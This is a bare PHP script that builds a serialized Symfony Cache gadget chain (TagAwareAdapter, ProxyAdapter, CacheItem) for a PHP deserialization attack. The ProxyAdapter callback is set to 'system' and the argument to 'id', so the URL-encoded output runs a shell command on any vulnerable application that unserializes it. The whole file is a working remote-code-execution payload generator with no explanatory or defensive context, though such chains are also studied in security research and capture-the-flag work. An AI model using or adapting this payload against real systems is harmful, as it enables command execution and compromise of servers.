<?php
namespace Symfony\Component\Cache\Adapter{
    class TagAwareAdapter{
        private $deferred;
        private $pool;
        function __construct($deferred, $pool){
            $this->deferred = $deferred;
            $this->pool = $pool;
        }
    }
    class ProxyAdapter{
        protected $poolHash;
        protected $setInnerItem;
        function __construct($setInnerItem, $poolHash){
            $this->poolHash = $poolHash;
            $this->setInnerItem = $setInnerItem;
        }
    }
}
namespace Symfony\Component\Cache{
    final class CacheItem{
        protected $expiry;
        protected $innerItem;
        protected $poolHash;
        function __construct($expiry, $poolHash, $innerItem){
            $this->poolHash = $poolHash;
            $this->expiry = $expiry;
            $this->innerItem = $innerItem;
        }
    }
}
namespace{
    $b = new Symfony\Component\Cache\Adapter\ProxyAdapter('system', 1);
    $d = new Symfony\Component\Cache\CacheItem(1, 1, "id");
    $a = new Symfony\Component\Cache\Adapter\TagAwareAdapter(array($d),$b);
    echo urlencode(serialize($a));
}
